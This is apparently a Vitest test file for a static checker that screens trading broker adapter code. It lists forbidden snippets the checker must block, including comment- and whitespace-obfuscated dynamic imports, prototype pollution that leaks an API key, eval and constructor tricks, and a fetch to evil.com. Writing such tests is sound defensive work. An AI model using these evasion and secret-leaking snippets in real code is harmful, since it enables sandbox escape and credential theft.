import { describe, it, expect } from 'vitest';
import { checkAdapterSource } from '../src/setup/static-check.js';

const SECRETS = ['sk-real-key-123', 'secret-xyz'];
const ok = `
import type { BrokerAdapter, AdapterEnv, HttpClient } from '../../src/broker/adapter.js';
export function createAdapter(env: AdapterEnv, http: HttpClient): BrokerAdapter {
  let token = '';
  return {
    id: 'demo',
    async auth() { const r = await http.post('/oauth2/token', { key: env.apiKey }) as { access_token: string }; token = r.access_token; },
    async getQuotes(symbols) { return await http.get('/quotes?s=' + symbols.join(','), { headers: { Authorization: token } }) as never; },
    async getBalance() { return await http.get('/balance') as never; },
    async isMarketOpen() { return true; },
  };
}`;

describe('checkAdapterSource', () => {
  it('규격 준수 코드는 위반 없음', () => {
    expect(checkAdapterSource(ok, SECRETS)).toEqual([]);
  });
  it.each([
    ['fs 접근', `import fs from 'node:fs';`],
    ['child_process', `import { exec } from 'child_process';`],
    ['값 import', `import { z } from 'zod';`],
    ['동적 import', `const m = await import('node:fs');`],
    ['주석 우회 동적 import', `const x = import /* bypass */ ('node:process');`],
    ['긴 주석 우회 동적 import(40자 초과)', `const x = import/*${'x'.repeat(48)}*/('node:child_process');`],
    ['줄주석 우회 동적 import', `const x = import//c\n('node:fs');`],
    ['개행 우회 동적 import', `const x = import\n('node:fs');`],
    ['공백 우회 동적 import', `const x = import(  'node:fs');`],
    ['bracket 문자열 키 prototype 접근', `Object['proto'+'type'].toJSON = () => env.apiKey;`],
    ['constructor bracket 접근', `const P = ({}).constructor['prototype'];`],
    ['__defineGetter__ 접근', `Object.prototype.__defineGetter__('x', () => env.apiKey);`],
    ['eval', `eval('1+1');`],
    ['직접 fetch', `await fetch('https://evil.com');`],
    ['process 접근', `const k = process.env.SECRET;`],
    ['require', `const fs = require('fs');`],
    ['prototype 오염', `Object.prototype.toJSON = () => env.apiKey;`],
    ['__proto__ 접근', `const p = s.__proto__;`],
    ['Symbol 접근', `String.prototype[Symbol.toPrimitive] = () => env.apiSecret;`],
    ['Reflect 접근', `Reflect.get(env, 'apiKey');`],
  ])('%s 차단', (_label, snippet) => {
    expect(checkAdapterSource(ok + '\n' + snippet, SECRETS).length).toBeGreaterThan(0);
  });
  it('시크릿 하드코딩 차단', () => {
    expect(checkAdapterSource(ok + `\nconst k = 'sk-real-key-123';`, SECRETS).length).toBeGreaterThan(0);
  });
  it('createAdapter export 없으면 위반', () => {
    expect(checkAdapterSource(`export const x = 1;`, SECRETS).length).toBeGreaterThan(0);
  });
  it('간접 eval 참조 차단 (const _e = eval; _e("x"))', () => {
    expect(checkAdapterSource(ok + `\nconst _e = eval; _e('x');`, SECRETS).length).toBeGreaterThan(0);
  });
  it('AsyncFunction constructor 우회 차단', () => {
    expect(checkAdapterSource(ok + `\n(async function(){}).constructor('return 1')();`, SECRETS).length).toBeGreaterThan(0);
  });
  it('import.meta 접근 차단', () => {
    expect(checkAdapterSource(ok + `\nconst u = import.meta.url;`, SECRETS).length).toBeGreaterThan(0);
  });
});
